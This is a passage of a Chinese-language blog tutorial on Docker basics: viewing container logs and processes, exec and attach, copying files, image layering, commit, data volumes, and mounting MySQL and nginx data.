-t --tail 容器ID&#96;	查看容器日志</span><br><span class="line"></span><br><span class="line">- -t：是加入时间戳</span><br><span class="line">- -f：跟随最新的日志打印</span><br><span class="line">- --tail [数字]：显示最后多少条</span><br><span class="line">- -tf：显示全部日志</span><br></pre></td></tr></table></figure>
<p>// docker run -d centos以后台的形式运行centos<br>// /bin/sh -c “while true;do echo hello world;循环的打印hello world<br>// sleep 2;done”每2秒打印这句话因为while是true死循环一直循环<br>说白了就是我要把这个输出打印到控制台上，这样就会导致前台有响应，这样后台启动的话docker也不会自我关闭<br>docker run -d centos /bin/sh -c “while true;do echo hello world;sleep 2;done”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">运行一下试试，先试用&#96;docker ps&#96;查看当前是否有运行的容器</span><br><span class="line"></span><br><span class="line">![image-20200508205354753](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508205354753.png)</span><br><span class="line"></span><br><span class="line">运行上面的Linux Shell编程，然后再使用docker ps查看结果</span><br><span class="line"></span><br><span class="line">&#96;docker run -d centos &#x2F;bin&#x2F;sh -c &quot;while true;do echo hello world;sleep 2;done&quot;&#96;</span><br><span class="line"></span><br><span class="line">状态返回了UP，说明运行成功</span><br><span class="line"></span><br><span class="line">![image-20200508205512712](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508205512712.png)</span><br><span class="line"></span><br><span class="line">虽然后台启动了，但不想有一个交互窗口，还是想在自己的宿主机，但是不能表示程序不能在后台安静的运行。</span><br><span class="line"></span><br><span class="line">此时就要看看&#96;docker logs 容器ID&#96;的日志，每隔两秒钟打印一个hello world后台有个程序跑着</span><br><span class="line"></span><br><span class="line">![image-20200508210007228](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508210007228.png)</span><br><span class="line"></span><br><span class="line">使用&#96;docker logs -tf 容器ID&#96;将时间戳打印，不停地追加(更新日志)。</span><br><span class="line"></span><br><span class="line">![image-20200508211210344](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508211210344.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用&#96;docker logs -tf --tail 3 容器ID&#96;将时间戳打印，不停地追加(更新日志)，并且只显示最后三条(--taile后面跟了数字3)，但是因为加了-f所以一直在追加。</span><br><span class="line"></span><br><span class="line">![image-20200508211149440](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508211149440.png)</span><br><span class="line"></span><br><span class="line">##### top	查看容器内运行的进程</span><br><span class="line"></span><br><span class="line">&#96;top&#96;命令式查看linux的进行，而查看docker容器的进程就使用&#96;docker top 容器ID&#96;</span><br><span class="line"></span><br><span class="line">为什么docker可以使用&#96;top&#96;，因为可以将docker看做是一个简易版的linux环境</span><br><span class="line"></span><br><span class="line">![image-20200508211740262](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508211740262.png)</span><br><span class="line"></span><br><span class="line">##### docker inspect	查看容器内部细节</span><br><span class="line"></span><br><span class="line">docker镜像是一层套一层就像一个同心圆一样，所以说&#96;inspect&#96;查看容器内部细节，意思就是描述整个容器，以一个阶层串的形式嵌套的形式描述</span><br><span class="line"></span><br><span class="line">告诉你容器全部的结构细节</span><br><span class="line"></span><br><span class="line">&#96;docker inspect 容器ID&#96;</span><br><span class="line"></span><br><span class="line">![image-20200508221907314](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508221907314.png)</span><br><span class="line"></span><br><span class="line">这个就是输出打印的内容</span><br><span class="line"></span><br><span class="line">![image-20200508222052594](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508222052594.png)</span><br><span class="line"></span><br><span class="line">只是整个id中的前几位</span><br><span class="line"></span><br><span class="line">![image-20200707193523775](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200707193523775.png)</span><br><span class="line"></span><br><span class="line">##### docker exec -it 容器ID &#x2F;bin&#x2F;bash	进入正在运行的容器并以命令行交互</span><br><span class="line"></span><br><span class="line">&#96;docker exec -it 容器ID &#x2F;bin&#x2F;bash&#96;</span><br><span class="line"></span><br><span class="line">重新进入&#96;docker attach 容器ID&#96;</span><br><span class="line"></span><br><span class="line">&#96;docker attach&#96;例：</span><br><span class="line"></span><br><span class="line">① 先使用&#96;docker run -it centos&#96;以交互模式创建一个伪终端(centos)</span><br><span class="line"></span><br><span class="line">② 再&#96;ctrl+p+q&#96;切换到宿主机</span><br><span class="line"></span><br><span class="line">③ 使用&#96;docker attach 容器ID&#96;重新进入这个容器</span><br><span class="line"></span><br><span class="line">![image-20200508235922305](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508235922305.png)</span><br><span class="line"></span><br><span class="line">&#96;docker exec -it 容器ID bashShell&#96;例：</span><br><span class="line"></span><br><span class="line">使用这个命令直接在宿主机就可以使用centos中&#96;ls -l&#96;命令查看tmp文件下的内容，而本身并没有进入容器中</span><br><span class="line"></span><br><span class="line">![image-20200509000527519](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509000527519.png)</span><br><span class="line"></span><br><span class="line">而&#96;docker exec&#96;可以和&#96;attach&#96;一样进入容器，它的功能比&#96;attach&#96;强大。</span><br><span class="line"></span><br><span class="line">①  可以不进入容器直接在宿主机使用&#96;docker exec&#96;进行centos命令的使用。</span><br><span class="line"></span><br><span class="line">② 也可以和&#96;docker attach&#96;一样进入容器</span><br></pre></td></tr></table></figure>
<p>docker exec     # 进入容器后开启一个新的终端，可以在里面操作（常用）<br>docker attach    # 进入容器 正在执行的终端，不会启动新的进程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![image-20200509000851503](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509000851503.png)</span><br><span class="line"></span><br><span class="line">##### docker cp 容器ID:容器内路径 目的主机路径		从容器内拷贝文件到主机上</span><br><span class="line"></span><br><span class="line">&#96;docker cp 容器ID:容器内路径 目的主机路径&#96;</span><br><span class="line"></span><br><span class="line">现在容器的tmp文件下新建一个111.txt文件夹，内容This is a my first code</span><br><span class="line"></span><br><span class="line">![image-20200509002902272](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509002902272.png)</span><br><span class="line"></span><br><span class="line">切换回宿主机，查看当前root下是否有111.txt，其中并没有111.txt</span><br><span class="line"></span><br><span class="line">![image-20200509003001581](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509003001581.png)</span><br><span class="line"></span><br><span class="line">使用&#96;docker cp 容器ID:路径 宿主机路径&#96;，然后使用&#96;ll&#96;查看当前路径下是否成功复制了111.txt并查看其内容。</span><br><span class="line"></span><br><span class="line">这样就成功将docker容器中的111.txt成功复制到宿主机上了</span><br><span class="line"></span><br><span class="line">![image-20200509003121627](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509003121627.png)</span><br><span class="line"></span><br><span class="line">#### docker镜像</span><br><span class="line"></span><br><span class="line">docker镜像是什么？</span><br><span class="line"></span><br><span class="line">镜像是一种轻量级、可执行的独立软件包，**用来打包软件运行环境和基于运行环境开发的软件**，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</span><br><span class="line"></span><br><span class="line">- UnionFS（联合文件系统）</span><br><span class="line">- Docker镜像加载原理</span><br><span class="line">- 分层镜像</span><br><span class="line">- 为什么Docker镜像要采用这种分层结构</span><br><span class="line"></span><br><span class="line">如何得到镜像：</span><br><span class="line"></span><br><span class="line">- 从远程仓库下载</span><br><span class="line">- 朋友拷贝给你</span><br><span class="line">- 自己制作一个镜像DockerF ile</span><br><span class="line"></span><br><span class="line">##### UnionFS（联合文件系统）</span><br><span class="line"></span><br><span class="line">UnionFS（联合文件系统）：Union文件系统（UnionFS）是一种分层，轻量级并且高性能的文件系统，它支持**对文件系统的修改作为一次提交来一层一层的叠加**，同时可以将不同目录挂载到同一个虚拟文件系统下（unite several directiories into a single virtual file system）。Union文件系统是Docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。</span><br><span class="line"></span><br><span class="line">特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录。</span><br><span class="line"></span><br><span class="line">##### Docker镜像加载原理</span><br><span class="line"></span><br><span class="line">docker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。</span><br><span class="line"></span><br><span class="line">botfs(boot file system)主要包含bootloader和kernel, botloader主要是引导加载kernel, Linux刚启动时会加载bootfs文件系统，**在Docker镜像的最底层是bootfs**。这- -层 与我们典型的Linux&#x2F;Unix系统是- -样的，包含boot加戟器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由botfs转交给内核，此时系统也会卸载botfs。</span><br><span class="line"></span><br><span class="line">rootfs (root file system)，在botfs之上.包含的就是典型Linux系统中的&#x2F;dev, &#x2F;proc, &#x2F;bin, &#x2F;etc 等标准目录和文件。roots就是各种不同的操作系统发行版，比如Ubuntu, Centos 等等。</span><br><span class="line"></span><br><span class="line">![image-20200509171839224](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509171839224.png)</span><br><span class="line"></span><br><span class="line">平时我们安装进虚拟机的Centos都是好几个G，为什么docker这里才200M</span><br><span class="line"></span><br><span class="line">![image-20200509171940133](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509171940133.png)</span><br><span class="line"></span><br><span class="line">##### 分层的镜像</span><br><span class="line"></span><br><span class="line">对于一个精简的OS，rootfs可以很小，只需要包括最基本的命令、工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供rootfs就行了。由此可见对于不同的linux发行版，bootfs基本是一致的，rootfs会有差别，因此不同的发行版可以公用bootfs。</span><br><span class="line"></span><br><span class="line">##### 为什么Docker镜像要采用这种分层结构呢</span><br><span class="line"></span><br><span class="line">最大的一个好处就是-共享资源</span><br><span class="line"></span><br><span class="line">比如：有多个镜像都从相同的base镜像构建而来，那么宿主机只需要在磁盘上保存一份base镜像，同时内存中只需加载一份base镜像，就可以为所有容器服务了，而且镜像的每一层都可以共享。</span><br><span class="line"></span><br><span class="line">![image-20200509174120126](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509174120126.png)</span><br><span class="line"></span><br><span class="line">##### 理解：</span><br><span class="line"></span><br><span class="line">所有的Docker镜像都起始于一个基础镜像层 。当进行修改或增加新的内容时。就会在当前镜像层之上,创建新的镜像层。举一个简单的例子,假如基于Ubuntu Linux 16.04创建一个新的境像 ,这就是新镜像的第-层;如果在该镜像中添加Python包，就会在基础镜像层之上创建第二个镜像层;如果继续添加一个安全补丁,就会创建第三个镜像层。该镜像当前已经包含3个镜像层,如下图所示(这只是一个用于演示的很简单的例子).</span><br><span class="line"></span><br><span class="line">![image-20200709101536512](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709101536512.png)</span><br><span class="line"></span><br><span class="line">在添加额外的境像屈的同时。镜像始终保持是当前所有镜像的组合。理解这一点非常重要。 下图中举了-个简单的例子,每个镜像层包含3个文件。而镜像包含了来自两个镜像层的6个文件。</span><br><span class="line"></span><br><span class="line">这两个镜像是没有冲突的，如果将它打包成镜像的时候，里面就会有六个文件，也就相当于有6层。</span><br><span class="line"></span><br><span class="line">![image-20200709101750617](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709101750617.png)</span><br><span class="line"></span><br><span class="line">上图中的镜像层跟之前图中的略有区别,主要目的是便于展示文件。</span><br><span class="line"></span><br><span class="line">下图中展示了一个稍微复杂的三层镜像。在外部看来整个镜像只有6个文件。这是因为最上层中的文件7是文件5的一个更新版本。所以文件7将文件5替换掉了，所以还是6层，这样就可以实现一些文件复用</span><br><span class="line"></span><br><span class="line">![image-20200709102140896](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709102140896.png)</span><br><span class="line"></span><br><span class="line">这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为- -个新镜像层添加到镜像当中。</span><br><span class="line">Docker通过存储引擎(新版本采用快照机制)的方式来实现镜像层堆栈,并保证多镜像层对外展示为统-的文件系统。</span><br><span class="line">Linux.上可用的存储弓|擎有AUFS、Overlay2、 Device Mapper、Btrfs 以及ZFS。顾名思义,每种存储引擎都基于Linux中对应的</span><br><span class="line">文件系统或者块设备技术,诅每种存储引擎都有其独有的性能特点。</span><br><span class="line">Docker在Windows.上仅支持windowsfilter -种存储引擎,该引擎基于NTFS文件系统之上实现了分层和CoW[1]。</span><br><span class="line">下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并,对外提供统-的视图。</span><br><span class="line"></span><br><span class="line">![image-20200709102529485](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709102529485.png)</span><br><span class="line"></span><br><span class="line">Docker镜像都是只读的,当容器启动时, -个新的可写层被加载到镜像的顶部!</span><br><span class="line"></span><br><span class="line">上面这句话的意思</span><br><span class="line"></span><br><span class="line">![image-20200709164201727](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709164201727.png)</span><br><span class="line">这一层就是我们通常说的容器层,容器之下的都叫镜像层!</span><br><span class="line"></span><br><span class="line">![image-20200709164833283](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709164833283.png)</span><br><span class="line"></span><br><span class="line">##### docker镜像特点</span><br><span class="line"></span><br><span class="line">docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部。这一层通常被称作“容器层”，“容器层”之下的都叫“镜像层”。</span><br><span class="line"></span><br><span class="line">##### Docker_镜像commit</span><br><span class="line"></span><br><span class="line">如果想要保存当前容器的状态，就可以通过commit来提交，获得一个镜像，可以看作为VM的快照功能</span><br><span class="line"></span><br><span class="line">docker_镜像commit操作:</span><br><span class="line"></span><br><span class="line">- docker commit 提交容器副本使之成为一个新的镜像</span><br><span class="line"></span><br><span class="line">  - &#96;docker run -it -p 8080:8080 tomcat&#96;</span><br><span class="line"></span><br><span class="line">    - -p 主机端口:docker容器端口</span><br><span class="line"></span><br><span class="line">    - -P 随机分配端口</span><br><span class="line"></span><br><span class="line">    - i：交互</span><br><span class="line">    - t：终端</span><br><span class="line"></span><br><span class="line">- docker commit -m&#x3D;&quot;提交的描述信息&quot;-a&#x3D;&quot;作者&quot;容器ID要创建的目标镜像名:[标签名]</span><br><span class="line"></span><br><span class="line">##### 案例演示</span><br><span class="line"></span><br><span class="line">- 从Hub上下载tomcat镜像到本地并成功运行</span><br><span class="line"></span><br><span class="line">  - &#96;docekr run -it -p 8080:8080 tomcat&#96;</span><br><span class="line"></span><br><span class="line">  - 使用&#96;docker ps&#96;查看端口，8888以为刚才这值得是8888当然这些端口都只是**映射端口**</span><br><span class="line"></span><br><span class="line">    - ![image-20200509211850828](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509211850828.png)</span><br><span class="line"></span><br><span class="line">    ![image-20200509211823006](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509211823006.png)</span><br><span class="line"></span><br><span class="line">    ![image-20200509212302011](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509212302011.png)</span><br><span class="line"></span><br><span class="line">    使用&#96;-P&#96;随机分配端口&#96;docker run -it -P tomcat&#96;端口号变成了32768</span><br><span class="line"></span><br><span class="line">    ![image-20200509212358609](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509212358609.png)</span><br><span class="line"></span><br><span class="line">    ![image-20200509214601158](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509214601158.png)</span><br><span class="line"></span><br><span class="line">- 故意删除上一步镜像生产tomcat容器的文档</span><br><span class="line"></span><br><span class="line">删除&#96;docs&#96;容器文档，再次访问8888页面，然后刷新</span><br><span class="line"></span><br><span class="line">![image-20200509221117054](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509221117054.png)</span><br><span class="line"></span><br><span class="line">访问8888之后就返回404因为你将容器文档删除了</span><br><span class="line"></span><br><span class="line">![image-20200509221245167](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509221245167.png)</span><br><span class="line"></span><br><span class="line">- 也即当前的tomcat运行实例是一个没有文档内容的容器，以它为模板commit一个没有doc的tomcat新镜像atguigu&#x2F;tomcat02</span><br><span class="line"></span><br><span class="line">  - 使用&#96;docker commit -a&#x3D;&quot;long&quot; -m&#x3D;&quot;del tomcat docs&quot; 2d73f0856d17 long&#x2F;tomcat02:1.2&#96;</span><br><span class="line"></span><br><span class="line">  ![image-20200509222553460](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509222553460.png)</span><br><span class="line"></span><br><span class="line">  访问之后并没有找到</span><br><span class="line"></span><br><span class="line">  ![image-20200509223418689](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509223418689.png)</span><br><span class="line"></span><br><span class="line">  直接拉取 tomcat</span><br><span class="line"></span><br><span class="line">  ![image-20200509223555485](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509223555485.png)</span><br><span class="line"></span><br><span class="line">  访问7788地址，成功访问了，这个是默认的并不是我们新建的</span><br><span class="line"></span><br><span class="line">  ![image-20200509223621247](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509223621247.png)</span><br><span class="line"></span><br><span class="line">- 启动我们的新镜像并和原来的对比</span><br><span class="line"></span><br><span class="line">  - 启动&#96;long&#x2F;tomcat02&#96;，它没有docs</span><br><span class="line">  - 启动原来的tomcat，它有docs</span><br><span class="line"></span><br><span class="line">**补充：**使用&#96;docker run -d -p 6666:8080 tomcat&#96;，后台的方式启动，它并没有在前台返回日志。</span><br><span class="line"></span><br><span class="line">![image-20200509224259556](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509224259556.png)</span><br><span class="line"></span><br><span class="line">在页面中访问6666端口依旧可以访问</span><br><span class="line"></span><br><span class="line">![image-20200509224419848](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509224419848.png)</span><br><span class="line"></span><br><span class="line">#### Docker容器数据卷</span><br><span class="line"></span><br><span class="line">使用Docker时，通常需要保存数据，或者在多个容器之间共享数据，这就涉及Docker 容器的数据操作。目前主要有两种方法可以管理容器中的数据:数据卷和数据卷容器。 </span><br><span class="line"></span><br><span class="line">数据卷(Data Volume)：将容器中的数据直接映射到本地宿主机。</span><br><span class="line"></span><br><span class="line">数据卷容器(Data Volume Container):使用特定容器维护数据卷。 </span><br><span class="line"></span><br><span class="line">##### 数据卷</span><br><span class="line"></span><br><span class="line">Docker的镜像是一系列只读层的组合，启动一个容器时，Docker加载镜像的所有只读 层，并向顶层添加读写层。这种设计提高了 Docker构建、存储和分发镜像的效率，节省了时 间和存储空间，但也存在以下问题。 </span><br><span class="line"></span><br><span class="line">- 容器中的文件以复杂的形式存储在宿主机上，在宿主机上不便于访问容器中的 文件。 </span><br><span class="line">- 多个容器之间的数据无法共享。 </span><br><span class="line">- 容器被删除，其产生的数据将丢失。 </span><br><span class="line"></span><br><span class="line">为了解决Docker在架构设计上的问题，引入了数据卷机制。数据卷可用于存储Docker 应用的数据以及Docker容器之间共享的数据。简单来说，数据卷的存在非常简单,可以绕 过默认的联合文件系统而以正常的文件或者目录的形式存在于宿主机中，即使被修改也不 会影响镜像。</span><br><span class="line"></span><br><span class="line">##### 使用Docker的数据卷可以实现以下功能。</span><br><span class="line"></span><br><span class="line">- 在容器启动时，数据卷被初始化;当容器使用的镜像在挂载点存在数据，则数据会被 拷贝到初始化后的数据卷中。 </span><br><span class="line">- 在不同的容器之间,数据卷可以被共享和重用。 </span><br><span class="line">- 数据卷可以在宿主和容器之间共享数据。 </span><br><span class="line">- 数据卷中的数据可在宿主机或容器内直接修改，修改完成后立即生效。 </span><br><span class="line">- 数据卷是持续性的，即使数据卷容器被删除,只要还有一个容器在使用该数据卷，数 据就不会被删除。 </span><br><span class="line">- 数据卷可以持久化数据，容器运行期间产生的数据并不会保存到镜像中，重新用此 镜像启动新的容器就会初始化镜像，会加一个全新的读写层来保存数据。</span><br><span class="line"></span><br><span class="line">Docker理念</span><br><span class="line"></span><br><span class="line">- 将运用与运行的环境打包形成容器运行，运行可以伴随着容器，但是我们对数据的要求希望是持久化的</span><br><span class="line">- 容器之间希望有可能共享数据</span><br><span class="line"></span><br><span class="line">![image-20200511205222360](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200511205222360.png)</span><br><span class="line"></span><br><span class="line">##### 使用数据卷</span><br><span class="line"></span><br><span class="line">&gt;方式一：直接使用命令来挂载 -v</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;shell</span><br><span class="line"># -v 就好比 -p 的端口映射</span><br><span class="line">docker run -it -v 主机目录:容器内目录</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 测试</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 1、在home目录下做测试，先查看home目录下有没有东西</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/docker/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200710101218417.png" alt="image-20200710101218417"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 2、使用以下命令，并进入容器的home文件查看里面内容</span></span><br><span class="line">docker run -it -v /home/test:/home centos /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710101442957.png" alt="image-20200710101442957"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 3、发现没有内容，打开一个新的窗口，查看本机的home文件下是否有内容</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 可以看到本地的home文件下已经生成了<span class="built_in">test</span>文件，<span class="built_in">test</span>文件中没有内容</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710101726407.png" alt="image-20200710101726407"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在容器中的home文件下随便进行操作，这里就创建个文件，查看本地home/<span class="built_in">test</span>下时候也同样的出现了改文件</span></span><br></pre></td></tr></table></figure>

<p><strong>容器</strong><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710101924190.png" alt="image-20200710101924190"></p>
<p><strong>本地</strong><img src="/2020/07/25/docker/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200710101956528.png" alt="image-20200710101956528"></p>
<p><strong>他是一个双向的，如果在本地修改文件，容器中也会进行同样的修改</strong></p>
<h4 id="实战：MySQL"><a href="#实战：MySQL" class="headerlink" title="实战：MySQL"></a>实战：MySQL</h4><p>思考：mysql的数据持久化问题</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取镜像</span></span><br><span class="line">docker pull mysql:5.7</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行镜像，进行数据挂载~  <span class="comment"># 安装启动mysql，需要配置密码</span></span></span><br><span class="line">docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 参数</span></span><br><span class="line">-d：后台运行</span><br><span class="line">-p：端口映射</span><br><span class="line">-v：数据卷挂载</span><br><span class="line">-e：环境配置</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 官方测试 </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -e 后面的MYSQL_ROOT_PASSWORD=密码    <span class="comment"># 这个就是设置mysql的密码</span></span></span><br><span class="line">docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动成功后，我们在本地使用sqlyog来进行测试</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sqlyog 连接到服务器的3310 --- 3310和容器内的3306映射</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在本地测试创建一个数据库，查看一下我们的映射路径是否成功</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710132456410.png" alt="image-20200710132456410"></p>
<p>假设将我们的容器删除</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710133139212.png" alt="image-20200710133139212"></p>
<p>发现我们挂载到本地的数据卷依旧没有丢失，这就实现了容器数据持久化功能！</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710133051813.png" alt="image-20200710133051813"></p>
<h4 id="具名和匿名挂载"><a href="#具名和匿名挂载" class="headerlink" title="具名和匿名挂载"></a>具名和匿名挂载</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 匿名挂载</span></span><br><span class="line">-v 容器内路径！</span><br><span class="line">docker run -d -P --name nginx01 -v /etc/nginx nginx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看所有的 volume 的情况</span></span><br><span class="line">docker volume ls</span><br><span class="line">DRIVER              VOLUME NAME</span><br><span class="line">local               358d04b6ef70c3c3c33abd7828ed32cffd78a445f402add1351cb20c8203594f</span><br><span class="line">local               c816c5026889b5ebfe1966c3658558348fbeed4aae4af1bb8a31d5714f916328</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里发现，这种就是匿名挂载，我们在 -v 只写了容器内的路径，没有写容器外的路径</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/docker/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200710140053130.png" alt="image-20200710140053130"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 具名挂载</span></span><br><span class="line">docker run -d -P --name nginx02 -v long-nginx:/ect/nginx nginx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看 volume 情况</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home# docker volume ls</span><br><span class="line">DRIVER              VOLUME NAME</span><br><span class="line">local               long-nginx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过 -v 卷名:容器内路径		<span class="comment"># 卷名只是给他命名的名字</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看一下这个卷</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710141307021.png" alt="image-20200710141307021"></p>
<p>所有的docker容器内的卷，没有定制目录的情况下都是在<code>/var/lib/docker/volumes/xxx/_data</code>下面。</p>
